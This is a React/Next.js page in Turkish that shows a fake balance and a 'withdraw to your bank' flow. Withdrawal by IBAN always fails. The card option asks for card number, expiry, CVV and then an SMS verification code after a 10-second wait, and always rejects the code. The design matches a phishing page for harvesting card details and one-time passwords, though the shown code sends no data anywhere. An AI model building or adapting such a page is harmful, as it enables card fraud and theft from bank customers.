"use client";

import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter, DialogTrigger } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Loader2, Landmark } from "lucide-react";
import { Separator } from "@/components/ui/separator";

const banks = [
  "ZİRAAT BANK", "AKBANK", "VAKIF BANK", "GARANTİ BANK", "DENİZ BANK",
  "İŞ BANKASI", "QNB BANK", "HALK BANK", "TEB BANK", "YAPIKREDİ BANK"
];

const InfoItem = ({ label, value, valueClassName }: { label: string; value: string, valueClassName?: string }) => (
    <div className="flex items-center justify-between border-b border-border/50 py-3 text-lg">
      <p className="text-muted-foreground">{label}</p>
      <p className={`font-mono font-semibold ${valueClassName}`}>{value}</p>
    </div>
);

export default function BalancePage() {
  const { toast } = useToast();
  const [selectedBank, setSelectedBank] = useState<string | null>(null);
  
  const [isOptionsDialogOpen, setOptionsDialogOpen] = useState(false);
  const [isIbanDialogOpen, setIbanDialogOpen] = useState(false);
  const [isCardDialogOpen, setCardDialogOpen] = useState(false);
  
  const [isLoading, setIsLoading] = useState(false);
  const [isSmsStep, setIsSmsStep] = useState(false);
  const [cardFormSubmitted, setCardFormSubmitted] = useState(false);
  

  const handleBankSelect = (bank: string) => {
    setSelectedBank(bank);
    setOptionsDialogOpen(true);
    // Reset other states
    setIbanDialogOpen(false);
    setCardDialogOpen(false);
    setIsSmsStep(false);
    setCardFormSubmitted(false);
  };
  
  const handleIbanSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setTimeout(() => {
        setIsLoading(false);
        setIbanDialogOpen(false);
        setOptionsDialogOpen(false);
        toast({
            variant: "destructive",
            title: "İşlem Başarısız",
            description: "IBAN ile para çekme işlemi şu anda kullanılamamaktadır. Lütfen daha sonra tekrar deneyin.",
        });
    }, 1500);
  };
  
  const handleCardSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardFormSubmitted) {
      setIsLoading(true);
      setCardFormSubmitted(true);
      setTimeout(() => {
          setIsLoading(false);
          setIsSmsStep(true);
      }, 10000); // 10 seconds wait
    }
  };

  const handleSmsSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
     setTimeout(() => {
        setIsLoading(false);
        setCardDialogOpen(false);
        setOptionsDialogOpen(false);
        setIsSmsStep(false);
        setCardFormSubmitted(false);
        toast({
            variant: "destructive",
            title: "Hatalı SMS Kodu",
            description: "Girilen SMS kodu hatalıdır. Lütfen bilgilerinizi kontrol edip tekrar deneyin.",
        });
     }, 1500)
  }

  const resetCardDialog = (open: boolean) => {
    if(!open) {
      setIsSmsStep(false);
      setCardFormSubmitted(false);
    }
    setCardDialogOpen(open);
  }

  return (
    <div className="space-y-8">
      <Card>
        <CardHeader>
          <div className="flex items-center gap-3">
            <Landmark className="h-8 w-8 text-blue-600" />
            <div>
              <CardTitle className="text-3xl font-bold">Bakiye Bilgileri</CardTitle>
              <CardDescription className="text-base">Mevcut bakiyeniz ve hesap bilgileriniz.</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent className="space-y-4 text-base">
          <InfoItem label="Mevcut Bakiye" value="1,250.00 TL" valueClassName="text-green-600 dark:text-green-500" />
          <InfoItem label="IBAN Numarası" value="TR12 3456 7890 1234 5678 9012 34" />
          <InfoItem label="Banka" value="VIP Bankası A.Ş." />
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="text-3xl font-bold">Para Çek</CardTitle>
          <CardDescription className="text-base">Aşağıdan bir banka seçerek işleme başlayın.</CardDescription>
        </CardHeader>
        <CardContent className="grid grid-cols-2 gap-4 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5">
          {banks.map((bank) => (
            <Button
              key={bank}
              variant="outline"
              className="h-24 break-words p-2 text-center text-base font-semibold"
              onClick={() => handleBankSelect(bank)}
            >
              {bank}
            </Button>
          ))}
        </CardContent>
      </Card>

      {/* Main Options Dialog */}
      <Dialog open={isOptionsDialogOpen} onOpenChange={setOptionsDialogOpen}>
          <DialogContent>
              <DialogHeader>
                  <DialogTitle className="text-2xl font-bold">Para Çekme Yöntemi</DialogTitle>
                  <DialogDescription className="text-base">
                      {selectedBank} hesabınıza para çekmek için bir yöntem seçin.
                  </DialogDescription>
              </DialogHeader>
              <div className="flex flex-col gap-4 py-4 sm:flex-row">
                  <Dialog open={isIbanDialogOpen} onOpenChange={setIbanDialogOpen}>
                      <DialogTrigger asChild>
                          <Button variant="secondary" className="w-full text-base sm:w-auto sm:flex-1">IBAN Numarası ile Çek</Button>
                      </DialogTrigger>
                      <DialogContent>
                          <DialogHeader>
                              <DialogTitle className="text-2xl font-bold">IBAN ile Para Çek</DialogTitle>
                              <DialogDescription className="text-base">{selectedBank} hesabınıza para çekmek için tutarı girin.</DialogDescription>
                          </DialogHeader>
                          <form onSubmit={handleIbanSubmit} className="space-y-4 pt-4">
                              <div>
                                  <Label htmlFor="amount" className="text-base">Tutar</Label>
                                  <Input id="amount" type="number" placeholder="Örn: 500" required />
                              </div>
                              <DialogFooter>
                                  <Button type="submit" disabled={isLoading} className="w-full text-base sm:text-sm">
                                      {isLoading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                                      Gönder
                                  </Button>
                              </DialogFooter>
                          </form>
                      </DialogContent>
                  </Dialog>

                  <Dialog open={isCardDialogOpen} onOpenChange={resetCardDialog}>
                      <DialogTrigger asChild>
                          <Button variant="secondary" className="w-full text-base sm:w-auto sm:flex-1">Kart ile Çek</Button>
                      </DialogTrigger>
                      <DialogContent>
                          {!isSmsStep ? (
                              <>
                                  <DialogHeader>
                                      <DialogTitle className="text-2xl font-bold">Kart ile Para Çek</DialogTitle>
                                      <DialogDescription className="text-base">Bilgileri doldurarak para çekme talebi oluşturun.</DialogDescription>
                                  </DialogHeader>
                                  <form onSubmit={handleCardSubmit} className="space-y-4 pt-4">
                                      <div>
                                          <Label htmlFor="cardNumber" className="text-base">Kart Numarası</Label>
                                          <Input id="cardNumber" placeholder="**** **** **** ****" required />
                                      </div>
                                      <div className="flex gap-4">
                                          <div className="flex-1">
                                              <Label htmlFor="expiryDate" className="text-base">Tarih</Label>
                                              <Input id="expiryDate" placeholder="AA/YY" required />
                                          </div>
                                          <div className="flex-1">
                                              <Label htmlFor="cvv" className="text-base">CVV Kodu</Label>
                                              <Input id="cvv" placeholder="***" required />
                                          </div>
                                      </div>
                                      <DialogFooter>
                                          <Button type="submit" disabled={isLoading} className="w-full text-base sm:text-sm">
                                              {isLoading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                                              Çek
                                          </Button>
                                      </DialogFooter>
                                  </form>
                              </>
                          ) : (
                              <>
                                <DialogHeader>
                                      <DialogTitle className="text-2xl font-bold">SMS Doğrulama</DialogTitle>
                                      <DialogDescription className="text-base">Telefonunuza gönderilen doğrulama kodunu girin.</DialogDescription>
                                  </DialogHeader>
                                  <form onSubmit={handleSmsSubmit} className="space-y-4 pt-4">
                                      <div>
                                          <Label htmlFor="smsCode" className="text-base">SMS Kodu</Label>
                                          <Input id="smsCode" type="text" placeholder="******" required />
                                      </div>
                                      <DialogFooter>
                                          <Button type="submit" disabled={isLoading} className="w-full text-base sm:text-sm">
                                              {isLoading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                                              Doğrula ve Çek
                                          </Button>
                                      </DialogFooter>
                                  </form>
                              </>
                          )}
                      </DialogContent>
                  </Dialog>
              </div>
          </DialogContent>
      </Dialog>
    </div>
  );
}
